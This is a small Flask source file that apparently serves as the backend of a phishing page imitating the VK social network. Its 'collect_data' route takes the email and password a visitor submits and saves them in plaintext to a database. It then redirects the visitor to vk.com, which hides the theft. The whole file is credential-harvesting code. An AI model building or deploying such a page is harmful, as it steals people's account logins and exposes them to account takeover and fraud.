from vk import app, db
from flask import render_template, url_for, flash, redirect, request
#from vk.forms import User_data
from vk.models import User



@app.route('/', methods=['POST', 'GET'])
@app.route("/home", methods=["POST", 'GET'])
def collect_data():
    if request.method == "POST":
        email = request.form['email']        #???
        password = request.form['password']
        user_data = User(email=email, password=password)

        db.session.add(user_data)
        db.session.commit()
        return redirect('/https://vk.com/')
    else:
        return render_template("home.html")